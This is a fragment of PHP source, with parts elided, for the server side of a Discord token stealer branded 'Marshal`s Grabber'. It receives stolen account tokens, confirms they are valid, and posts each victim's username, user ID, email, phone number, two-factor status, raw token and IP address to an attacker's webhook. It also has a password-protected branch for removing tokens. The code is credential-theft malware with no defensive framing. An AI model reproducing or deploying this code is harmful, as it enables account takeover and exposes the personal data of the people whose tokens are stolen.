            ...
            if(htmlspecialchars($_GET['type']) == "addtoken") {
                if(strlen($token) == 59 || strlen($token) == 88) {
                    ...
                    if (isset($data->id) && !empty($data->id)) {
                        ...
                        if($count == 0) {
                            ...
                            SendToWebhook($api_webhook, json_encode(["username" => "Marshal`s Grabber","avatar_url" => "https://i.imgur.com/9NNLgx1.jpg","embeds" => [["description" => ">>> __Account Informations:__\n```asciidoc\n- Username: " . strval($data->username)."#".strval($data->discriminator) . "\n- User ID: ".strval($data->id)."\n- Email: ".strval($data->email)."\n- Phone: ".strval($phone)."\n- Nitro Type: ".strval($nitro_type)."\n- A2F Enable: ".$mfa."\n```\n\n__Token:__\n```".$token."```\nIP Adress: `".$_SERVER['REMOTE_ADDR']."`","footer" => ["text" => "Marshal`s Grabber - https://github.com/cepheidev","icon_url" => "https://i.imgur.com/j79yzMM.gif"],"thumbnail" => ["url" => "https://cdn.discordapp.com/avatars/" . $data->id . "/" . $data->avatar]]]]));
                        } else {
                ...
                if(isset($input_pass) && !empty($input_pass)) {
                    if($input_pass == $api_password) {
                        ...
                        SendToWebhook($api_webhook, json_encode(["username" => "Marshal`s Grabber","avatar_url" => "https://i.imgur.com/9NNLgx1.jpg","embeds" => [["description" => "> Token Removed From Database:\n```" . $token . "```\nIp Adress: `".$_SERVER['REMOTE_ADDR']."`","footer" => ["text" => "Marshal`s Grabber - https://github.com/cepheidev","icon_url" => "https://i.imgur.com/j79yzMM.gif"]]]]));
